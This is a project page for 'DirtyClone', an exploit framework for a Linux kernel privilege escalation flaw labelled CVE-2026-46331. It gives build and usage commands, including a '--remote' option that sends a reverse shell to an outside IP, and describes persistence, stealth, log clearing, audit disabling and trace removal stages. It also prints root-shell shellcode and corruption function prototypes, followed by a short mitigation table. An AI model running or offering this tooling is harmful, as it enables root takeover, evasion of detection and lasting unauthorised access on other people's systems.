---
layout: page
title: "DirtyClone Exploit Framework"
subtitle: "CVE-2026-46331 — Linux Kernel Local Privilege Escalation Research Tool"
permalink: /tools/my-repo/dirtyclone/
category: my-repo
tags: [exploit, kernel, LPE, CVE, C, Python, research]
status: release
version: "1.0.0"
github_repo: "https://github.com/vulnquest58/dirtyclone-exploit"
language: C / Python
date: 2026-06-28
---

<div class="tool-hero" style="background: linear-gradient(135deg, rgba(124,58,237,0.15) 0%, rgba(220,38,38,0.1) 100%); border: 1px solid rgba(124,58,237,0.3); border-radius: 16px; padding: 2rem; margin-bottom: 2rem;">
  <div style="display:flex; align-items:center; gap:1rem; margin-bottom:1rem;">
    <span style="font-size:3rem;">💀</span>
    <div>
      <h1 style="margin:0; font-size:1.8rem; color:var(--text-primary);">DirtyClone Exploit Framework</h1>
      <p style="margin:0; color:var(--accent-primary); font-family: var(--font-mono); font-size:0.9rem;">CVE-2026-46331 · v1.0.0 · Linux Kernel ≤ 6.12.9</p>
    </div>
  </div>
  <p style="margin:0; color:var(--text-secondary); line-height:1.7;">
    A professional-grade exploit framework for <strong>CVE-2026-46331</strong> — a Linux kernel local privilege escalation vulnerability caused by a race condition between the TC <code>pedit</code> action and IPsec TEE packet duplication, enabling arbitrary read-only page cache corruption by an unprivileged user.
  </p>
  <div style="display:flex; gap:0.75rem; margin-top:1.25rem; flex-wrap:wrap;">
    <a href="https://github.com/vulnquest58/dirtyclone-exploit" target="_blank" class="btn btn-primary" style="text-decoration:none;"><i class="fab fa-github"></i> GitHub Repository</a>
    <a href="{{ '/CVE-2026-46331/' | relative_url }}" class="btn btn-secondary" style="text-decoration:none;"><i class="fas fa-file-alt"></i> Full CVE Write-up</a>
    <span class="tag" style="background:rgba(220,38,38,0.2); color:#f87171; border:1px solid rgba(220,38,38,0.4); padding:6px 12px; border-radius:6px; font-size:0.8rem; font-weight:600;">⚠️ Research Only</span>
  </div>
</div>

---

## Overview

**DirtyClone** is a staged exploit framework that automates the complete attack chain for CVE-2026-46331, from initial environment reconnaissance through to a root shell. It is written in **C** with supporting **Python** analysis modules and is designed to demonstrate the vulnerability's mechanics in isolated research environments.

> ⚠️ **For educational and research purposes only.** Use exclusively in environments you own or have explicit written authorization to test.

---

## Vulnerability Summary

| Property | Value |
|----------|-------|
| **CVE ID** | CVE-2026-46331 |
| **CVSS 3.1** | **8.8 HIGH** |
| **Attack Vector** | Local |
| **Privileges Required** | Low (unprivileged user) |
| **Affected Kernel** | Linux ≤ 6.12.9 |
| **Patched Version** | 6.12.10 |
| **Root Cause** | TC `pedit` IHL=15 + IPsec TEE page-cache race |
| **Impact** | Root shell (`UID=0 EUID=0`) |

### How It Works

When a packet traverses the TC egress path with `pedit` setting `IHL = 15`, the IPsec subsystem receives a malformed packet where the computed IP payload offset exceeds actual boundaries. Combined with concurrent `sendfile(2)` operations, an unprivileged user inside a user namespace (with `CAP_NET_ADMIN`) can corrupt **read-only page cache entries** of SUID binaries — injecting arbitrary shellcode that executes with elevated privileges.

---

## Project Structure

```
dirtyclone-exploit/
├── Makefile                          # Build system
├── include/
│   ├── exploit.h                     # Core types, flags, prototypes
│   ├── packet_engine.h               # Raw packet crafting API
│   ├── memory_ops.h                  # Page cache corruption API
│   └── persistence.h                 # Persistence mechanism API
├── src/
│   ├── main.c                        # Framework entry point
│   ├── stage_env_analysis.c          # Phase 1: Reconnaissance
│   ├── stage_namespace_bypass.c      # Phase 2: userns bypass
│   ├── stage_network_setup.c         # Phase 3: TC/IPsec setup
│   ├── stage_page_cache_corrupt.c    # Phase 4: Core exploit primitive
│   ├── stage_privilege_escalation.c  # Phase 5: LPE execution
│   ├── stage_persistence.c           # Phase 6: Persistence (6 methods)
│   ├── stage_evasion.c               # Phase 7: Anti-forensics
│   ├── stage_cleanup.c               # Phase 8: Trace removal
│   ├── memory_ops.c                  # Page cache primitives impl.
│   ├── packet_engine.c               # Raw socket packet crafter
│   └── persistence.c                 # Persistence implementations
├── modules/
│   ├── exploit_analyzer.py           # Pre-exploit reconnaissance
│   └── packet_craft.py               # Python packet trigger (Scapy)
└── scripts/
    ├── setup_env.sh                  # Auto dependency + build
    ├── cleanup.sh                    # System artifact removal
    └── detect_targets.sh             # Vulnerable binary scanner
```

---

## Installation

### Requirements

- **Compiler**: GCC ≥ 10
- **Libraries**: `libcap-dev`, `libc6-dev`
- **Runtime**: `iproute2`, `iptables`
- **Kernel**: Linux ≤ 6.12.9 (target system)
- **Python** (optional): `scapy` for packet module

### Build

```bash
# Clone
git clone https://github.com/vulnquest58/dirtyclone-exploit.git
cd dirtyclone-exploit

# Auto setup (installs dependencies + builds)
sudo bash scripts/setup_env.sh

# Manual build
make all

# Debug build with GDB support
make debug
```

---

## Usage

```bash
# Show help
./bin/dirtyclone --help

# Dry run: analysis only, no exploitation
./bin/dirtyclone --test

# Basic exploitation (default: /usr/bin/su)
sudo ./bin/dirtyclone

# Custom target + stealth + persistence
sudo ./bin/dirtyclone --target /usr/bin/sudo --stealth --persist

# Reverse shell to remote host
sudo ./bin/dirtyclone --remote 192.168.1.100 4444 --cleanup
```

### CLI Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `--target PATH` | String | Target SUID binary (default: `/usr/bin/su`) |
| `--stealth` | Flag | Enable stealth mode + process camouflage |
| `--persist` | Flag | Install persistence after root |
| `--cleanup` | Flag | Remove all traces after exploitation |
| `--remote IP PORT` | String / Int | Send reverse shell to IP:PORT |
| `--test` | Flag | Dry-run: reconnaissance only |
| `--debug` | Flag | Verbose debug output |

---

## Exploitation Stages

The framework executes an 8-stage pipeline, each with automatic retry logic (up to 999 attempts):

```
Stage 1 ── Environment Analysis      Kernel version, SUID targets, security modules
Stage 2 ── Namespace Bypass          unshare / aa-exec / LD_PRELOAD methods
Stage 3 ── Network Setup             clsact qdisc + pedit filter + IPsec ESP + TEE
Stage 4 ── Page Cache Corruption     sendfile / mmap / splice / packet / proc/mem
Stage 5 ── Privilege Escalation      execve corrupted binary → root shell
Stage 6 ── Persistence               6 methods: cron / SSH / SUID / systemd / etc.
Stage 7 ── Evasion                   log clearing, timestomp, audit disable
Stage 8 ── Cleanup                   TC teardown, temp files, cache flush
```

---

## Python Modules

### `exploit_analyzer.py` — Pre-Exploit Reconnaissance

```bash
# Full analysis of target
python3 modules/exploit_analyzer.py --target /usr/bin/sudo

# JSON output for automation pipelines
python3 modules/exploit_analyzer.py --json

# Scan all SUID binaries on the system
python3 modules/exploit_analyzer.py --all-suid
```

**Output includes:**
- Kernel version + vulnerability status
- ELF entry point virtual address and file offset
- Security module detection (AppArmor, SELinux, seccomp)
- Feature availability (TC, IPsec, user namespaces)
- Recommended corruption method

### `packet_craft.py` — Packet Trigger Module

```bash
# Send exploit packets to a specific file offset
sudo python3 modules/packet_craft.py --offset 0x40a0 --count 20

# Use custom interface
sudo python3 modules/packet_craft.py --iface eth0 --offset 0x1234
```

Supports both **Scapy** (if installed) and raw socket fallback.

---

## Core Implementation

### Page Cache Corruption Primitives

The framework implements 5 independent corruption methods, tried in order:

```c
/* Method 1: sendfile + pedit (primary) */
int corrupt_with_sendfile(int fd, off_t offset,
                          const void *data, size_t len);

/* Method 2: mmap + direct write */
int corrupt_with_mmap(int fd, off_t offset,
                      const void *data, size_t len);

/* Method 3: splice + vmsplice */
int corrupt_with_splice(int fd, off_t offset,
                        const void *data, size_t len);

/* Method 4: Raw UDP packet trigger */
// via PacketSocket + craft_udp_packet()

/* Method 5: /proc/pid/mem injection */
int corrupt_with_proc_mem(const char *target, off_t offset,
                          const void *data, size_t len);
```

### Root Shell Shellcode (x86-64)

```c
/* setgid(0) + setuid(0) + execve("/bin/sh") */
static const uint8_t shellcode[] = {
    0x31, 0xff, 0xb8, 0x6a, 0x00, 0x00, 0x00, 0x0f, 0x05,  // setgid(0)
    0x31, 0xff, 0xb8, 0x69, 0x00, 0x00, 0x00, 0x0f, 0x05,  // setuid(0)
    0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52,
    0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,
    0x0f, 0x05                                              // execve
};
```

---

## Defensive Countermeasures

| Mitigation | Priority | Command |
|-----------|----------|---------|
| Kernel update | **Critical** | Upgrade to ≥ 6.12.10 |
| Disable user namespaces | **High** | `echo 0 > /proc/sys/kernel/unprivileged_userns_clone` |
| AppArmor userns restriction | **High** | Enable `apparmor` profile with userns deny |
| Audit TC syscalls | **Medium** | `auditctl -a always,exit -F arch=b64 -S unshare` |
| File integrity monitoring | **Medium** | Deploy AIDE/Tripwire on SUID binaries |
| Seccomp filters | **Medium** | Block `unshare()` in production containers |

---

## Technical References

- [CVE-2026-46331 Full Write-up]({{ '/CVE-2026-46331/' | relative_url }}) — Detailed analysis on this site
- [GitHub Repository](https://github.com/vulnquest58/dirtyclone-exploit) — Source code
- [Linux TC Subsystem Docs](https://www.kernel.org/doc/html/latest/networking/tc-actions-env-rules.html)
- [IPsec/XFRM Documentation](https://www.kernel.org/doc/html/latest/networking/xfrm_proc.html)
- [User Namespace Security](https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html)

---

## Changelog

| Version | Date | Changes |
|---------|------|---------|
| **v1.0.0** | 2026-06-28 | Initial public release — full 8-stage exploit pipeline |

---

<div style="background:rgba(220,38,38,0.1); border:1px solid rgba(220,38,38,0.3); border-radius:8px; padding:1rem; margin-top:1.5rem;">
  <strong style="color:#f87171;">⚠️ Legal Disclaimer</strong><br>
  <span style="color:var(--text-secondary); font-size:0.9rem;">
    This framework is provided strictly for security research, education, and authorized penetration testing. The author assumes no responsibility for misuse. Always obtain explicit written authorization before testing against any system you do not own.
  </span>
</div>
